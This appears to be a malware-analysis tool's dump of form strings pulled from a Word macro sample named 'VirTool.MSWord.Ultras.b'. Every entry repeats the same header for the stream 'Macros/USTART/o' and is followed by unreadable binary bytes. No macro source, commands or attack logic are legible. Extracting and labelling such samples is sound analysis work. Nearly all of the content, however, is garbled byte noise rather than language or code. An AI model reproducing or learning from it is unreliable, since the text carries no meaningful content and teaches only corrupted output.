VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
GGH���������������������������##%%%''')))+++---///1113335ttv������EEH;;><<?==A??B@@CAAEBBFDDGEEH���������������JJNKKOLLOLLPMMQNNPNNROOROOR||~���������QRTQRTQRTRSTRURRUQRVPRWNRXM���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1=#.7!)0 %+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
e@@��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ǐ���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ُ�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!$$&((*,,/������������LLPDDHHHKKKOOOSRRVUUYXX][[`^^c���������qqwkkpnnsppvssxuu{xx~xx�ww�vv����������������������������������������jj�ij�hi�hi�gh�gh�fg�fg�fg�fg�eg�ef�eg�fg�fg�fg�fg�������������ij�jk�kl�lm�mn�no�pp�qr�������������ww}rrxmmshhmccg]]aWW[QQUJJNDDGnnp������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s���������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
FFF������������������������eee  !""$$$&&&(((***,,,/..0002���������vvw88;::=;;>==@>>A??B@@DBBECCF���������������HHLIIMJJNKKNKKOLLPMMPMMQNNRzz}���������PQSPQSPQRQSSQSRQTQQTPQVORXL���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3?#.7"*2!&,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d@@����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ŀ��������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ֿ�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������			
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
  "%%'))+--0������������BBEEEIIIMLLPPPTSSWVV[ZZ^\\a__d������������llqnntqqvssyvv{xx~xx�ww�vw����������������������������������������kk�jk�ij�ij�hi�hi�hi�gh�gh�gh����������������������������������kl�lm�mn�no�op�qq�rr�st����������ww}rrxmmshhmcch]]bXX\RRVKKOEEI>>Bjjk������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`@@�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
DDD������������������������SSU
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 !!###%%%''')))+++---/������������66877:99;::=;;>==@>>A??B@@D���������������FFJGGKHHLIILJJMJJNKKOLLOLLPzz|���������NNROPROOROPQPRQPRPPSOPUMQWL���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2?#.8#+3"&,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
a@@����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ӿ�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������



-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!#%%'**,..0������������BBFFFJJJNNNQQQUTTYXX\[[_^^baae������������mmroouqqwttyvv|xx~xx�ww�vw����������������������������������������ll�kl�kk�jk�jk�ij�ij�ij�ij�ij����������������������������������mn�no�op�pq�qr�ss�tt�uv����������rrwmmrhhmcch^^bXX]RRWMMPFFJ@@C99<ffh������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i@@�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
AAA������������������������QQR
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
  !""$$$&&&(((***,������������33544766877:99<::=;;>==@>>A���������������DDHEEIFFIGGJHHKHHLIIMJJMJJNxx{���������MMPMMQNOPNOPNPPOQNORNOSMOUK���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3@$/9$*2"'- #(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������GGF
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_@@����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
п�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������


-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
""#&&(**-//1������������CCGGGKKKONNRRRVUUZYY]\\`__cbbf������������nnsppvrrxttzvv|xxxx�wx�ww����������������������������������������mm�lm�ll�kl�kl�kl�kk�jk�jk�jk����������������������������������op�pq�qr�rs�st�uu�vv�wx����������llrhhmcch^^cYY]SSWMMQHHKAAE;;>557bbd������������		

-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r@@�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�PP�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@@A������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
   """$$$&&&(������������//211433544766877:88;::=;;>mmo������������BBECCFDDGDDHEEIFFJGGJGGKHHLwwy���������KKOKKNLMOLMNMONMPNMPMNSJNTJ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3?%0:#+3#(.!$)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������778
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\@@����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ϳ�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������


-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
""$'')++-002������������DDHHHLLLOOOSSSWVV[YY^]]a``dcch������������oouqqwssyuu{ww}yyxx�ww�ww����������������������������������������nn�mn�mn�mm�lm�lm�lm�ll�ll�ll����������������������������������qr�rr�ss�tt�uv�ww�xx�ww~������~~�ggmcch^^cYY]TTXNNRIILCCF==@669002__`������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z@@�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@@E������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 !!"##$������������,,...0//211322544655877988;kkm������������??B@@CAADBBECCFDDGDDHEEIFFIttw���������IILIILJKLJKMKMLKMLKNKLPJLRH���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4A%0;$-5#)/!%)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@@Y������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
X@@����������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�PP����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ʿ�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 ##$''),,.002������������EEHIILLLPPPTTTXWW[ZZ_^^baaecch������������ppvrrxttzvv|xx~yyxx�ww�ww����������������������������������������oo�no�no�nn�mn�mn�mn�mn�mn�mn����������������������������������ss�tt�uu�vv�ww�xxvv|ssy������gglccg^^cYY^TTXOOSIIMDDG>>A88:114++-[[\������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@@J������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 ������������((***,,,.--0//1003224336557hhk������������<<?==@>>A??B@@CAADBBEBBFCCGssu���������FFJGHJHIJHIKHJJIKJILIJOGJPF���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4A%0;$-5#)/"%) !%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
00H������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T@@����������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ǿ�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 ##%((*,,.113������������EEIIIMMMQQQUTTYXX\[[`^^caafddi������������qqwssyuu{ww}xx~yy�xx�ww�ww����������������������������������������pp�op�op�oo�oo�oo�oo�oo�oo�oo����������������������������������uu�vv�ww�xx�xx~uu{rrwnnt��ۼ��bbg^^bYY^TTYOOSJJNEEH??B99<336--/&&(XXY������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������
-------------------------------------------------------------------------------
